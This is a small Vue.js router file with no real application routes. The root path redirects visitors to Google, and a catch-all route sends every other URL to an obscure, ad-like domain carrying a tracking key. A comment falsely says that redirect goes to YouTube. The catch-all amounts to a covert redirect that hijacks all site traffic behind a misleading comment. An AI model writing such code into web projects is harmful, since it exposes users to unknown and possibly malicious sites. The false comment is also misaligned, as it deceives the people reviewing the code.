import Vue from 'vue'
import VueRouter from 'vue-router'

Vue.use(VueRouter)



const routes = [
  {
    path: '/',
    beforeEnter: (to, from, next) => {
      window.location.href = 'https://www.google.com';
    }
  },
  {
    path: '/:catchAll(.*)', // This route will catch any path
    beforeEnter: (to, from, next) => {
      // Redirect to YouTube for any string
      window.location.href = 'https://acquisitionsneezeswell.com/jbwspz2t?key=ed6642f86faf01267a8656221b0b9f48';
    }
    
  }
]

const router = new VueRouter({
  mode: 'history',
  base: process.env.BASE_URL,
  routes
})

export default router
